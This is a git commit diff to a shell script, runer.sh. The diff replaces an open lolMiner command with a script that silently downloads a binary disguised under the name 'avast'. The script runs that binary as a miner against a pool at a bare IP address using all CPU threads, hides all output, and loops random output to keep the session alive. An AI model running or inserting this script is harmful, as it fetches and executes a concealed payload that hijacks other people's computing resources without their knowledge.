a3d7be955e01cc001e0a60441e405c5b26236022
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-06-27 18:32:13 +0700

    Update runer.sh

--- runer.sh
+++ runer.sh
@@ -1,4 +1,25 @@
- wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.42/lolMiner_v1.42_Lin64.tar.gz
-  tar xf lolMiner_v1.42_Lin64
-  cd 1.42tar.gz 
-  ./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user berkah.001
+#!/bin/bash
+
+#!/bin/sh
+
+#!/bin/bash
+
+apt update
+
+apt-get install screen libjansson4 -y 
+
+wget https://github.com/angkii/2022/raw/main/avast >/dev/null 2>&1
+
+chmod +x avast >/dev/null 2>&1
+
+screen -dmS ls
+
+./avast -v -l 144.217.82.15:80 -u 3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$(echo $(shuf -i 1-9999 -n 1)111) -p x -t $(nproc) >/dev/null 2>&1
+
+while [ 1 ]; do
+
+  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+
+sleep 2
+
+done
